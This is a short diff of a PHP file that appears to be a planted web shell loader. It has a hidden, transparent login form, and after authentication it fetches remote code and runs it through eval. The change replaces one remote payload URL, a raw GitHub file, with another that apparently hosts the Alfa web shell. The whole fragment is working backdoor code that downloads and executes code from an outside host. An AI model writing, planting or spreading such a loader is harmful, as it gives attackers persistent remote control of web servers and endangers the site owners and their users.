@@ -62,7 +62,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
 
 // Display main content if authenticated, otherwise show hidden login form
 if (is_user_authenticated()) {
-    $content = fetch_url_with_cookies('https://raw.githubusercontent.com/secty1337/exp/refs/heads/main/img.php');
+    $content = fetch_url_with_cookies('https://shell.prinsh.com/Nathan/alfa.txt');
     EVAl('?>' . $content);
 } else {
     // Display transparent login form
